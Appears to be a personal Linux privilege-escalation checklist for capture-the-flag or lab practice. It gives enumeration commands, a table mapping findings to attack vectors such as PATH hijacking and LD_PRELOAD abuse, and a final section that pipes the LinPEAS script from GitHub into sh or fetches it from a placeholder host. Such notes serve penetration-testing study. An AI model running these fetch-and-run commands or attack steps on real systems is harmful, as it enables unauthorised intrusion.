# PRIVESC CHECKLIST (Linux)

> **Pin this. Copy-paste these commands when stuck on privesc.**

---

## 🔍 RUN THESE IN ORDER

### **1. Who am I?**
```bash
whoami
id
groups
```

### **2. What can I run as sudo?**
```bash
sudo -l
```
**If output shows anything:** Check GTFOBins → https://gtfobins.github.io/

---

### **3. SUID binaries**
```bash
find / -perm -4000 2>/dev/null
```
**If unfamiliar binaries found:** Check GTFOBins for exploitation method

---

### **4. Cron jobs**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
```
**If cron jobs exist:**
- Read the script being executed
- Check if script is writable
- Look for wildcards in commands (e.g., `tar -czf backup.tar.gz *`)

---

### **5. PATH variable**
```bash
echo $PATH
```
**If `/tmp` or other writable directory in PATH:**
- Potential PATH hijacking opportunity

---

### **6. Writable files in sensitive locations**
```bash
# Writable directories
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc | head -20
```

---

### **7. Running processes as root**
```bash
ps aux | grep root
```

---

### **8. Capabilities**
```bash
getcap -r / 2>/dev/null
```
**If capabilities found:** Research the specific capability

---

### **9. Environment variables**
```bash
env
```
**Look for:** LD_PRELOAD, LD_LIBRARY_PATH

---

### **10. Kernel version (LAST RESORT)**
```bash
uname -a
cat /proc/version
```
**Only use kernel exploits if nothing else works** (unstable, can crash system)

---

## 🎯 PATTERN MATCHING GUIDE

| Finding | Likely Vector | Action |
|---------|---------------|--------|
| Sudo permission on binary | Sudo abuse | Check GTFOBins |
| SUID on unusual binary | SUID exploitation | Check GTFOBins |
| Cron job with wildcards | Wildcard injection | Create malicious filenames |
| Cron job with writable script | Script hijacking | Modify script |
| Writable directory in PATH | PATH hijacking | Create malicious binary |
| LD_PRELOAD in env | Library preloading | Compile malicious .so file |
| Old kernel version | Kernel exploit | searchsploit (LAST RESORT) |

---

## 🔗 USEFUL RESOURCES

- **GTFOBins:** https://gtfobins.github.io/
- **searchsploit:** `searchsploit <service> <version>`
- **Your notes:** Search "privilege escalation" in THM-Pen-Testing-Notes.md

---

## ⚡ QUICK AUTOMATED ENUM (Optional)

If manual enum isn't revealing anything:

```bash
# LinPEAS (noisy but thorough)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or upload it
wget http://<your-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**But manual enumeration FIRST. Always.**
